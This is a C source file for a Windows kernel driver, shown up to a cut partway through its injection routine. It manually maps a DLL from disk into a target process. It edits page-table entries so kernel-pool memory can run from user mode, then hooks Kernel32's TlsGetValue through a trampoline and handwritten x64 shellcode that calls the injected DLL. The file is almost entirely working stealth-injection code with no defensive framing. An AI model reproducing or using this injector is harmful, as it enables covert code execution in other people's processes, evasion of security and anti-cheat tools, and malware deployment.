#include <Ntifs.h>
#include <intrin.h>
#include <ntimage.h>
#include <ntstrsafe.h>

#define DELAY_ONE_MICROSECOND (-10)
#define DELAY_ONE_MILLISECOND (DELAY_ONE_MICROSECOND*1000)
#define DLLPATH  L"\\??\\C:\\Users\\yongcai\\Desktop\\Ycix64.dll"

NTKERNELAPI PPEB NTAPI PsGetProcessPeb(IN PEPROCESS Process);
NTKERNELAPI PPEB NTAPI PsGetProcessWow64Process(PEPROCESS Process);

ULONG64 g_oep = 0;
ULONG g_injectPid = 0;
BOOLEAN g_IsEB = FALSE;
PVOID g_shellCode = NULL;
ULONG g_allocateSize = 0;
ULONG64 g_funcoffset = 0;
ULONG64 g_funcAddress = 0;
PWORK_QUEUE_ITEM g_workItem = NULL;

typedef struct _PEB32 {
	UCHAR InheritedAddressSpace;
	UCHAR ReadImageFileExecOptions;
	UCHAR BeingDebugged;
	UCHAR BitField;
	ULONG Mutant;
	ULONG ImageBaseAddress;
	ULONG Ldr;
	ULONG ProcessParameters;
	ULONG SubSystemData;
	ULONG ProcessHeap;
	ULONG FastPebLock;
	ULONG AtlThunkSListPtr;
	ULONG IFEOKey;
	ULONG CrossProcessFlags;
	ULONG UserSharedInfoPtr;
	ULONG SystemReserved;
	ULONG AtlThunkSListPtr32;
	ULONG ApiSetMap;
} PEB32, * PPEB32;

typedef struct _PEB_LDR_DATA {
	ULONG Length;
	UCHAR Initialized;
	PVOID SsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _PEB {
	UCHAR InheritedAddressSpace;
	UCHAR ReadImageFileExecOptions;
	UCHAR BeingDebugged;
	UCHAR BitField;
	PVOID Mutant;
	PVOID ImageBaseAddress;
	PPEB_LDR_DATA Ldr;
	PVOID ProcessParameters;
	PVOID SubSystemData;
	PVOID ProcessHeap;
	PVOID FastPebLock;
	PVOID AtlThunkSListPtr;
	PVOID IFEOKey;
	PVOID CrossProcessFlags;
	PVOID KernelCallbackTable;
	ULONG SystemReserved;
	ULONG AtlThunkSListPtr32;
	PVOID ApiSetMap;
} PEB, * PPEB;

typedef struct _PEB_LDR_DATA32 {
	ULONG Length;
	UCHAR Initialized;
	ULONG SsHandle;
	LIST_ENTRY32 InLoadOrderModuleList;
	LIST_ENTRY32 InMemoryOrderModuleList;
	LIST_ENTRY32 InInitializationOrderModuleList;
} PEB_LDR_DATA32, * PPEB_LDR_DATA32;

typedef struct _LDR_DATA_TABLE_ENTRY32 {
	LIST_ENTRY32 InLoadOrderLinks;
	LIST_ENTRY32 InMemoryOrderLinks;
	LIST_ENTRY32 InInitializationOrderLinks;
	ULONG DllBase;
	ULONG EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING32 FullDllName;
	UNICODE_STRING32 BaseDllName;
	ULONG Flags;
	USHORT LoadCount;
	USHORT TlsIndex;
	LIST_ENTRY32 HashLinks;
	ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY32, * PLDR_DATA_TABLE_ENTRY32;

typedef struct _LDR_DATA_TABLE_ENTRY {
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG Flags;
	USHORT LoadCount;
	USHORT TlsIndex;
	LIST_ENTRY HashLinks;
	ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

typedef struct _KLDR_DATA_TABLE_ENTRY {
	LIST_ENTRY InLoadOrderLinks;
	PVOID ExceptionTable;
	ULONG ExceptionTableSize;
	PVOID GpValue;
	ULONG UnKnow;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG Flags;
	USHORT LoadCount;
	USHORT __Unused5;
	PVOID SectionPointer;
	ULONG CheckSum;
	PVOID LoadedImports;
	PVOID PatchInformation;
} KLDR_DATA_TABLE_ENTRY, * PKLDR_DATA_TABLE_ENTRY;

PVOID GetUserModule(IN PEPROCESS EProcess, IN PUNICODE_STRING ModuleName, IN BOOLEAN IsWow64)
{
	if (EProcess == NULL)
		return NULL;
	__try
	{
		if (IsWow64)
		{
			PPEB32 Peb32 = (PPEB32)PsGetProcessWow64Process(EProcess);
			if (Peb32 == NULL)
				return NULL;

			if (!Peb32->Ldr)
				return NULL;

			for (PLIST_ENTRY32 ListEntry = (PLIST_ENTRY32)((PPEB_LDR_DATA32)Peb32->Ldr)->InLoadOrderModuleList.Flink;
				ListEntry != &((PPEB_LDR_DATA32)Peb32->Ldr)->InLoadOrderModuleList;
				ListEntry = (PLIST_ENTRY32)ListEntry->Flink)
			{
				UNICODE_STRING UnicodeString;
				PLDR_DATA_TABLE_ENTRY32 LdrDataTableEntry32 = CONTAINING_RECORD(ListEntry, LDR_DATA_TABLE_ENTRY32, InLoadOrderLinks);
				RtlUnicodeStringInit(&UnicodeString, (PWCH)LdrDataTableEntry32->BaseDllName.Buffer);
				if (RtlCompareUnicodeString(&UnicodeString, ModuleName, TRUE) == 0)
					return (PVOID)LdrDataTableEntry32->DllBase;
			}
		}
		else
		{
			PPEB Peb = PsGetProcessPeb(EProcess);
			if (!Peb)
				return NULL;

			if (!Peb->Ldr)
				return NULL;

			for (PLIST_ENTRY ListEntry = Peb->Ldr->InLoadOrderModuleList.Flink;
				ListEntry != &Peb->Ldr->InLoadOrderModuleList;
				ListEntry = ListEntry->Flink)
			{
				PLDR_DATA_TABLE_ENTRY LdrDataTableEntry = CONTAINING_RECORD(ListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
				if (RtlCompareUnicodeString(&LdrDataTableEntry->BaseDllName, ModuleName, TRUE) == 0)
					return LdrDataTableEntry->DllBase;
			}
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {}

	return NULL;
}

PVOID GetModuleExport(IN PVOID ModuleBase, IN PCCHAR FunctionName)
{
	PIMAGE_DOS_HEADER ImageDosHeader = (PIMAGE_DOS_HEADER)ModuleBase;
	PIMAGE_NT_HEADERS32 ImageNtHeaders32 = NULL;
	PIMAGE_NT_HEADERS64 ImageNtHeaders64 = NULL;
	PIMAGE_EXPORT_DIRECTORY ImageExportDirectory = NULL;
	ULONG ExportDirectorySize = 0;
	ULONG_PTR FunctionAddress = 0;

	if (ModuleBase == NULL)
		return NULL;

	__try
	{
		if (ImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
		{
			return NULL;
		}

		ImageNtHeaders32 = (PIMAGE_NT_HEADERS32)((PUCHAR)ModuleBase + ImageDosHeader->e_lfanew);
		ImageNtHeaders64 = (PIMAGE_NT_HEADERS64)((PUCHAR)ModuleBase + ImageDosHeader->e_lfanew);

		if (ImageNtHeaders64->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
		{
			ImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(ImageNtHeaders64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + (ULONG_PTR)ModuleBase);
			ExportDirectorySize = ImageNtHeaders64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
		}
		else
		{
			ImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(ImageNtHeaders32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + (ULONG_PTR)ModuleBase);
			ExportDirectorySize = ImageNtHeaders32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
		}

		PUSHORT pAddressOfOrds = (PUSHORT)(ImageExportDirectory->AddressOfNameOrdinals + (ULONG_PTR)ModuleBase);
		PULONG  pAddressOfNames = (PULONG)(ImageExportDirectory->AddressOfNames + (ULONG_PTR)ModuleBase);
		PULONG  pAddressOfFuncs = (PULONG)(ImageExportDirectory->AddressOfFunctions + (ULONG_PTR)ModuleBase);

		for (ULONG i = 0; i < ImageExportDirectory->NumberOfFunctions; ++i)
		{
			USHORT OrdIndex = 0xFFFF;
			PCHAR  pName = NULL;

			if ((ULONG_PTR)FunctionName <= 0xFFFF)
			{
				OrdIndex = (USHORT)i;
			}

			else if ((ULONG_PTR)FunctionName > 0xFFFF && i < ImageExportDirectory->NumberOfNames)
			{
				pName = (PCHAR)(pAddressOfNames[i] + (ULONG_PTR)ModuleBase);
				OrdIndex = pAddressOfOrds[i];
			}

			else
				return NULL;
			if (((ULONG_PTR)FunctionName <= 0xFFFF && (USHORT)((ULONG_PTR)FunctionName) == OrdIndex + ImageExportDirectory->Base) ||
				((ULONG_PTR)FunctionName > 0xFFFF && strcmp(pName, FunctionName) == 0))
			{
				PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((PUCHAR)ImageNtHeaders64 + sizeof(ImageNtHeaders64->Signature) + sizeof(ImageNtHeaders64->FileHeader) + ImageNtHeaders64->FileHeader.SizeOfOptionalHeader);
				for (int j = 0; j < ImageNtHeaders64->FileHeader.NumberOfSections; j++)
				{
					if (memcmp(".text", pSectionHeader->Name, strlen(".text") + 1) == 0)
					{
						if (pAddressOfFuncs[OrdIndex] > pSectionHeader->VirtualAddress + pSectionHeader->SizeOfRawData)
						{
							return (PVOID)pAddressOfFuncs[OrdIndex];
						}
					}
					pSectionHeader++;
				}

				FunctionAddress = pAddressOfFuncs[OrdIndex] + (ULONG_PTR)ModuleBase;
				break;
			}
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {}

	return (PVOID)FunctionAddress;
}

PUCHAR SearchModuleTextNop(IN PVOID ModuleBase, int len , ULONG offset)
{
	if (ModuleBase == NULL)
		return NULL;

	__try
	{
		PIMAGE_DOS_HEADER ImageDosHeader = (PIMAGE_DOS_HEADER)ModuleBase;
		if (ImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
		{
			return NULL;
		}
		PIMAGE_NT_HEADERS64 pImageNtHeaders64 = (PIMAGE_NT_HEADERS64)((PUCHAR)ModuleBase + ImageDosHeader->e_lfanew);
		PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((PUCHAR)pImageNtHeaders64 + sizeof(pImageNtHeaders64->Signature) + sizeof(pImageNtHeaders64->FileHeader) + pImageNtHeaders64->FileHeader.SizeOfOptionalHeader);

		PUCHAR endAddress = 0;
		PUCHAR starAddress = 0;
		for (int i = 0; i < pImageNtHeaders64->FileHeader.NumberOfSections; i++)
		{
			if (memcmp(".text", pSectionHeader->Name, strlen(".text") + 1) == 0)
			{
				starAddress = pSectionHeader->VirtualAddress + (PUCHAR)ModuleBase;
				endAddress = pSectionHeader->VirtualAddress + (PUCHAR)ModuleBase + pSectionHeader->SizeOfRawData;
				break;
			}
			pSectionHeader++;
		}

		if (endAddress && starAddress)
		{
			for (; starAddress < endAddress - len - 1; starAddress++)
			{
				ProbeForRead(starAddress, sizeof(PVOID), 1);
				int i = 0;
				for (; i < len; i++)
				{
					if (0x00 != starAddress[i])
						break;
				}
				if (i == len)
				{
					return starAddress + offset;
				}
			}
		}
	}__except (EXCEPTION_EXECUTE_HANDLER) {}

	return NULL;
}

NTSTATUS MapSC(PUCHAR shellcode, PVOID address, ULONG len)
{
	BOOLEAN isLock = FALSE;
	NTSTATUS status = STATUS_UNSUCCESSFUL;

	PMDL mdl = IoAllocateMdl(address, PAGE_SIZE, FALSE, FALSE, NULL);
	__try
	{
		MmProbeAndLockPages(mdl, UserMode, IoReadAccess);
		isLock = TRUE;

		PVOID virtualAddress = MmMapLockedPagesSpecifyCache(mdl, KernelMode, MmCached, NULL, FALSE, NormalPagePriority);
		if (virtualAddress)
		{
			memcpy(virtualAddress, shellcode, len);
			status = STATUS_SUCCESS;
			MmUnmapLockedPages(virtualAddress, mdl);
			if (isLock)
			{
				MmUnlockPages(mdl);
			}
			IoFreeMdl(mdl);
			mdl = NULL;
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		if (isLock)
		{
			MmUnlockPages(mdl);
		}
		IoFreeMdl(mdl);
		mdl = NULL;
	}
	return status;
}

ULONG_PTR GetPTEBase()
{
	ULONG_PTR PXEPA = __readcr3() & 0xFFFFFFFFF000;
	PHYSICAL_ADDRESS PXEPAParam;
	PXEPAParam.QuadPart = (LONGLONG)PXEPA;
	ULONG_PTR PXEVA = (ULONG_PTR)MmGetVirtualForPhysical(PXEPAParam);
	if (PXEVA)
	{
		ULONG_PTR PXEOffset = 0;
		do
		{
			if ((*(PULONGLONG)(PXEVA + PXEOffset) & 0xFFFFFFFFF000) == PXEPA)
				return (PXEOffset + 0xFFFF000) << 36;
			PXEOffset += 8;
		} while (PXEOffset < PAGE_SIZE);
	}
	return 0;
}

ULONG64 MiGetXXXAddress(ULONG64 VirtualAddress, PVOID PteBase) {
	return ((VirtualAddress >> 9) & 0x7FFFFFFFF8) + (ULONG64)PteBase;
}

VOID Modify2UserMem()
{
	if (g_shellCode && g_allocateSize)
	{
		PULONG64 PteBase = (PULONG64)GetPTEBase();
		if (PteBase)
		{
			for (ULONG i = 0; i < g_allocateSize / PAGE_SIZE; i++)
			{
				PULONG64 Pte = (PULONG64)MiGetXXXAddress((ULONG64)g_shellCode + (ULONG64)i * PAGE_SIZE, PteBase);
				PULONG64 Pde = (PULONG64)MiGetXXXAddress((ULONG64)Pte, PteBase);
				PULONG64 Ppe = (PULONG64)MiGetXXXAddress((ULONG64)Pde, PteBase);
				PULONG64 Pxe = (PULONG64)MiGetXXXAddress((ULONG64)Ppe, PteBase);
				if (MmIsAddressValid(Pte) && MmIsAddressValid(Pde) && MmIsAddressValid(Ppe) && MmIsAddressValid(Pxe))
				{
					*Pte |= 4;
					*Pde |= 4;
					*Ppe |= 4;
					*Pxe |= 4;
				}
				else if (MmIsAddressValid(Pde) && MmIsAddressValid(Ppe) && MmIsAddressValid(Pxe))//2m page
				{
					*Pde |= 4;
					*Ppe |= 4;
					*Pxe |= 4;
				}
				else if (MmIsAddressValid(Ppe) && MmIsAddressValid(Pxe))//1g page
				{
					*Ppe |= 4;
					*Pxe |= 4;
				}
			}
		}
	}
}

VOID Modify2KernelMem()
{
	if (g_shellCode && g_allocateSize)
	{
		PEPROCESS pEprocess = NULL;
		if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)g_injectPid, &pEprocess)))
		{
			KAPC_STATE kApc = { 0 };
			KeStackAttachProcess(pEprocess, &kApc);
			PULONG64 PteBase = (PULONG64)GetPTEBase();
			if (PteBase)
			{
				for (ULONG i = 0; i < g_allocateSize / PAGE_SIZE; i++)
				{
					PULONG64 Pte = (PULONG64)MiGetXXXAddress((ULONG64)g_shellCode + (ULONG64)i * PAGE_SIZE, PteBase);
					PULONG64 Pde = (PULONG64)MiGetXXXAddress((ULONG64)Pte, PteBase);
					PULONG64 Ppe = (PULONG64)MiGetXXXAddress((ULONG64)Pde, PteBase);
					PULONG64 Pxe = (PULONG64)MiGetXXXAddress((ULONG64)Ppe, PteBase);

					if (MmIsAddressValid(Pte) && MmIsAddressValid(Pde) && MmIsAddressValid(Ppe) && MmIsAddressValid(Pxe))
					{
						*Pte &= 0xfffffffffffffffb;
						*Pde &= 0xfffffffffffffffb;
						*Ppe &= 0xfffffffffffffffb;
						*Pxe &= 0xfffffffffffffffb;
					}
					else if (MmIsAddressValid(Pde) && MmIsAddressValid(Ppe) && MmIsAddressValid(Pxe))//2m page
					{
						*Pde &= 0xfffffffffffffffb;
						*Ppe &= 0xfffffffffffffffb;
						*Pxe &= 0xfffffffffffffffb;
					}
					else if (MmIsAddressValid(Ppe) && MmIsAddressValid(Pxe))//1g page
					{
						*Ppe &= 0xfffffffffffffffb;
						*Pxe &= 0xfffffffffffffffb;
					}
				}
			}
			KeUnstackDetachProcess(&kApc);
			ObDereferenceObject(pEprocess);
		}
	}
}

NTSTATUS MapDLLAndFixIAT(IN PEPROCESS EProcess)
{
	NTSTATUS Status;
	HANDLE FileHandle;
	IO_STATUS_BLOCK ioStatus;
	UNICODE_STRING uniFileName;
	FILE_STANDARD_INFORMATION FileInformation;
	RtlInitUnicodeString(&uniFileName, DLLPATH);

	OBJECT_ATTRIBUTES objectAttributes;
	InitializeObjectAttributes(&objectAttributes, &uniFileName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);

	Status = IoCreateFile(&FileHandle, FILE_READ_ATTRIBUTES | SYNCHRONIZE, &objectAttributes, &ioStatus, 0, FILE_READ_ATTRIBUTES, FILE_SHARE_READ, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0, CreateFileTypeNone, NULL, IO_NO_PARAMETER_CHECKING);
	if (!NT_SUCCESS(Status))
		return Status;

	Status = ZwQueryInformationFile(FileHandle, &ioStatus, &FileInformation, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);
	if (!NT_SUCCESS(Status))
	{
		ZwClose(FileHandle);
		return Status;
	}

	if (FileInformation.EndOfFile.HighPart != 0)
	{
		ZwClose(FileHandle);
		return Status;
	}

	ULONG64 uFileSize = FileInformation.EndOfFile.LowPart;
	PVOID pBuffer = ExAllocatePoolWithTag(PagedPool, uFileSize + PAGE_SIZE, 'YC');
	if (pBuffer == NULL)
	{
		ZwClose(FileHandle);
		return Status;
	}

	LARGE_INTEGER byteOffset = { 0 };
	Status = ZwReadFile(FileHandle, NULL, NULL, NULL, &ioStatus, pBuffer, (ULONG)uFileSize, &byteOffset, NULL);
	if (!NT_SUCCESS(Status))
	{
		ZwClose(FileHandle);
		return Status;
	}

	PIMAGE_DOS_HEADER ImageDosHeader = (PIMAGE_DOS_HEADER)pBuffer;
	if (ImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		return STATUS_UNSUCCESSFUL;
	}
	PIMAGE_NT_HEADERS64 pImageNtHeaders64 = (PIMAGE_NT_HEADERS64)((PUCHAR)pBuffer + ImageDosHeader->e_lfanew);
	PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((PUCHAR)pImageNtHeaders64 + sizeof(pImageNtHeaders64->Signature) + sizeof(pImageNtHeaders64->FileHeader) + pImageNtHeaders64->FileHeader.SizeOfOptionalHeader);

	g_allocateSize = pImageNtHeaders64->OptionalHeader.SizeOfImage + PAGE_SIZE;
	g_shellCode = ExAllocatePoolWithTag(NonPagedPool, g_allocateSize, 'Yci');
	if (g_shellCode)
	{
		RtlZeroMemory(g_shellCode, g_allocateSize);
		g_shellCode = (PVOID)((ULONG64)g_shellCode + PAGE_SIZE);

		memcpy(g_shellCode, pBuffer, pImageNtHeaders64->OptionalHeader.SizeOfHeaders);

		for (int i = 0; i < pImageNtHeaders64->FileHeader.NumberOfSections; i++)
		{
			memcpy((PUCHAR)g_shellCode + pSectionHeader->VirtualAddress, (PUCHAR)pBuffer + pSectionHeader->PointerToRawData,
				pSectionHeader->SizeOfRawData == 0 ? pSectionHeader->Misc.VirtualSize : pSectionHeader->SizeOfRawData);
			pSectionHeader++;
		}

		PIMAGE_EXPORT_DIRECTORY pExportHeader = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)g_shellCode + pImageNtHeaders64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
		PULONG  pAddressOfFuncs = (PULONG)(pExportHeader->AddressOfFunctions + (ULONG64)g_shellCode);
		g_oep = (ULONG64)g_shellCode + pAddressOfFuncs[0];

		PIMAGE_IMPORT_DESCRIPTOR pImportHeader = (PIMAGE_IMPORT_DESCRIPTOR)((PUCHAR)g_shellCode + pImageNtHeaders64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
		while (pImportHeader->Name && pImportHeader->Characteristics)
		{
			WCHAR wName[0x20] = { 0 };
			UNICODE_STRING uniDllName;
			PCHAR name = (PCHAR)g_shellCode + pImportHeader->Name;
			RtlStringCbPrintfW(wName, 0x20, L"%hs", name);
			RtlInitUnicodeString(&uniDllName, wName);
			PVOID pModuleBase = GetUserModule(EProcess, &uniDllName, FALSE);

			PIMAGE_THUNK_DATA64 pImageThunkData = (PIMAGE_THUNK_DATA64)(pImportHeader->FirstThunk + (PUCHAR)g_shellCode);
			while (pImageThunkData->u1.AddressOfData && pModuleBase)
			{
				if ((pImageThunkData->u1.Ordinal & IMAGE_ORDINAL_FLAG64) == 0)
				{
					PIMAGE_IMPORT_BY_NAME pImageImportName = (PIMAGE_IMPORT_BY_NAME)(pImageThunkData->u1.AddressOfData + (PUCHAR)g_shellCode);
					PVOID func = GetModuleExport(pModuleBase, pImageImportName->Name);
					if (func && func < pModuleBase)
					{
						if (memcmp((PUCHAR)pModuleBase + (ULONG64)func, "NTDLL", strlen("NTDLL")) == 0)//NTDLL.RtlEncodePointer
						{
							UNICODE_STRING Kernel32String = RTL_CONSTANT_STRING(L"Ntdll.dll");
							PVOID NtdllAddress = GetUserModule(EProcess, &Kernel32String, FALSE);
							func = GetModuleExport(NtdllAddress, (PCCHAR)pModuleBase + (ULONG64)func + strlen("NTDLL."));
						}
					}

					if (func)
						pImageThunkData->u1.Function = (ULONG64)func;
				}
				pImageThunkData++;
			}
			pImportHeader++;
		}

		ULONG64 baseAddressoffest = ((ULONG64)g_shellCode) - (pImageNtHeaders64->OptionalHeader.ImageBase);
		PIMAGE_BASE_RELOCATION pRelocation = (PIMAGE_BASE_RELOCATION)((PUCHAR)g_shellCode + pImageNtHeaders64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
		while (pRelocation->SizeOfBlock && pRelocation->VirtualAddress)
		{
			ULONG iTypeOffsetCount = (ULONG)(pRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
			for (ULONG i = 0; i < iTypeOffsetCount; i++)
			{
				USHORT TypeOffsetInfo = *(USHORT*)((PUCHAR)pRelocation + sizeof(IMAGE_BASE_RELOCATION) + i * sizeof(USHORT));
				USHORT TypeOffsetFlag = (TypeOffsetInfo >> 12) & 0x000F;
				if (IMAGE_REL_BASED_HIGHLOW == TypeOffsetFlag || TypeOffsetFlag == IMAGE_REL_BASED_DIR64)
				{
					ULONG64 relocationAddress = (ULONG64)g_shellCode + pRelocation->VirtualAddress + (TypeOffsetInfo & 0x0FFF);
					*(PULONG64)relocationAddress += baseAddressoffest;
				}
			}
			pRelocation = (PIMAGE_BASE_RELOCATION)((ULONG64)pRelocation + pRelocation->SizeOfBlock);
		}

		g_shellCode = (PVOID)((ULONG64)g_shellCode - PAGE_SIZE);
	}

	ExFreePoolWithTag(pBuffer, 'YC');
	ZwClose(FileHandle);
	return Status;
}

VOID Sleep(LONG msec)
{
	LARGE_INTEGER my_interval;
	my_interval.QuadPart = DELAY_ONE_MILLISECOND;
	my_interval.QuadPart *= msec;
	KeDelayExecutionThread(KernelMode, 0, &my_interval);
}

PVOID fixThread(PVOID Parameter)
{
	while (TRUE)
	{
		if (g_shellCode && *(PULONG64)((ULONG64)g_shellCode + PAGE_SIZE / 2 + 8))
		{
			PEPROCESS pEprocess = NULL;
			if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)Parameter, &pEprocess)))
			{
				KAPC_STATE kApc = { 0 };
				KeStackAttachProcess(pEprocess, &kApc);
				MapSC((PUCHAR)& g_funcoffset, (PUCHAR)g_funcAddress + 1, sizeof(ULONG));
				KeUnstackDetachProcess(&kApc);
				ObDereferenceObject(pEprocess);
			}
			break;
		}
		Sleep(233);
	}
	return NULL;
}

PVOID fixTlsGetValue(ULONG pid)
{
	g_workItem = (PWORK_QUEUE_ITEM)ExAllocatePoolWithTag(NonPagedPool, sizeof(WORK_QUEUE_ITEM), 'Yi');
	if (g_workItem)
	{
		ExInitializeWorkItem(g_workItem, (PWORKER_THREAD_ROUTINE)fixThread, (PVOID)pid);
		ExQueueWorkItem(g_workItem, DelayedWorkQueue);
	}
	return NULL;
}

NTSTATUS InjectProcessX64(ULONG pid)
{
	PEPROCESS pEprocess = NULL;
	if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)pid, &pEprocess)))
	{
		KAPC_STATE kApc = { 0 };
		KeStackAttachProcess(pEprocess, &kApc);
		MapDLLAndFixIAT(pEprocess);
		Modify2UserMem();

		UNICODE_STRING Kernel32String = RTL_CONSTANT_STRING(L"Kernel32.dll");
		PVOID Kernel32Address = GetUserModule(pEprocess, &Kernel32String, FALSE);//
		
		if (Kernel32Address && g_shellCode)
		{
			PVOID func = GetModuleExport(Kernel32Address, "TlsGetValue");
			PVOID relayAddress = SearchModuleTextNop(Kernel32Address,0x28, 0);
			//PVOID shellcodeAddress = SearchModuleTextNop(Kernel32Address, 0x88 + 0x28, 0x28);
			if (func && relayAddress)// && shellcodeAddress)
			{
				__try 
				{
					UCHAR checkPid[] =
					{
					  0x65, 0x48, 0x8B, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00,        // mov rax, gs:[0x30]
					  0x8B, 0x40, 0x40,                                            // mov eax,[rax+0x40] ; pid
					  0x3D, 0x00, 0x00, 0x00, 0x00,                                // cmp eax, TargetPid
					  0x0F, 0x85, 0x00, 0x00, 0x00, 0x00,                          // jne 0xAABBCC
					  0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // mov rax, KernelMemory
					  0xFF, 0xE0                                                   // jmp rax
					};
					ULONG64 tagetAddress = 0;
					g_funcAddress = (ULONG64)func;

					if (((PUCHAR)func)[0] == 0xEB)//support win7
					{
						g_funcoffset = (ULONG)*(PUCHAR)((PUCHAR)func + 1);
						tagetAddress = (ULONG64)func + g_funcoffset + 2;
						g_funcoffset = tagetAddress - g_funcAddress - 5;
					}
					else
					{
						g_funcoffset = *(ULONG*)((PUCHAR)func + 1);
						tagetAddress = (ULONG64)func + g_funcoffset + 5;
					}

					ULONG jneAddress = (ULONG)(tagetAddress - (ULONG64)((PUCHAR)relayAddress + 17) - 6);
					memcpy(checkPid + 13, &pid, sizeof(ULONG));
					memcpy(checkPid + 19, &jneAddress, sizeof(ULONG));
					memcpy(checkPid + 25, &g_shellCode, sizeof(ULONG64));
					//memcpy(checkPid + 25, &shellcodeAddress, sizeof(ULONG64));
					MapSC(checkPid, relayAddress, sizeof(checkPid));

					UCHAR shellCode[] =
					{
						0x41, 0x57,                             // push r15
						0x41, 0x56,                             // push r14
						0x41, 0x55,                             // push r13
						0x41, 0x54,                             // push r12
						0x41, 0x53,                             // push r11
						0x41, 0x52,                             // push r10
						0x41, 0x51,                             // push r9
						0x41, 0x50,                             // push r8
						0x50,                                   // push rax
						0x51,                                   // push rcx
						0x53,                                   // push rbx
						0x52,                                   // push rdx
						0x55,                                   // push rbp
						0x54,                                   // push rsp
						0x56,                                   // push rsi
						0x57,                                   // push rdi
						0x66, 0x9C,                             // pushf
						0x48, 0x83, 0xEC, 0x1E,                 // sub rsp, 0x20
						0x48, 0xBB, 0, 0, 0, 0, 0, 0, 0, 0,     // mov rbx,g_shellcode+0x500
						0x48, 0x8B, 0x03,                       // mov rax,qword ptr ds:[rbx]
						0x48, 0x83, 0xF8, 0x00,                 // cmp rax,0
						0x75, 0x48,							    // jne add rsp, 0x28
						0x48, 0xB8, 1, 0, 0, 0, 0, 0, 0, 0,     // mov rax,1
						0xF0, 0x48, 0x0F, 0xC1, 0x03,           // lock xadd qword ptr ds:[rbx],rax
						0x48, 0x83, 0xF8, 0x00,                 // cmp rax,0
						0x75, 0x33,							    // jne add rsp, 0x28
						0x48, 0xB9, 0, 0, 0, 0, 0, 0, 0, 0,     // mov rcx,hModule
						0x48, 0xBA, 0, 0, 0, 0, 0, 0, 0, 0,     // mov rdx,DLL_PROCESS_ATTACH
						0x4D, 0x33, 0xC0,                       // xor r8,r8
						0x4D, 0x33, 0xC9,                       // xor r9,r9
						0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0,     // mov rax,oep
						0xFF, 0xD0,                             // call rax
						0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0,     // mov rax,GameOver
						0x48, 0x89, 0x08,                       // mov qword ptr ds:[rax],rcx
						0x48, 0x83, 0xC4, 0x1E,                 // add rsp, 0x20
						0x66, 0x9D,                             // popf
						0x5F,                                   // pop rdi
						0x5E,                                   // pop rsi 
						0x5C,                                   // pop rsp
						0x5D,                                   // pop rbp
						0x5A,                                   // pop rdx
						0x5B,                                   // pop rbx
						0x59,                                   // pop rcx
						0x58,                                   // pop rax
						0x41, 0x58,                             // pop r8
						0x41, 0x59,                             // pop r9
						0x41, 0x5A,                             // pop r10
						0x41, 0x5B,                             // pop r11
						0x41, 0x5C,                             // pop r12
						0x41, 0x5D,                             // pop r13
						0x41, 0x5E,                             // pop r14
						0x41, 0x5F,                             // pop r15
						0x50,                                   // push rax
						0x50,                                   // push rax 
						0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0,     // mov rax, orgEip
						0x48, 0x89, 0x44, 0x24, 0x08,           // mov [rsp+8],rax
						0x58,                                   // pop rax
						0xC3                                    // ret
					};
					ULONG64 dllStats = 1;
					ULONG64 hModule = (ULONG64)g_shellCode + PAGE_SIZE;
					ULONG64 flagAddress = (ULONG64)g_shellCode + PAGE_SIZE/2;
					ULONG64 flagoverAddress = (ULONG64)g_shellCode + PAGE_SIZE / 2 + 8;
					memcpy(shellCode + 32, &flagAddress, sizeof(ULONG64));
					memcpy(shellCode + 32 + 31 + 9, &hModule, sizeof(ULONG64));
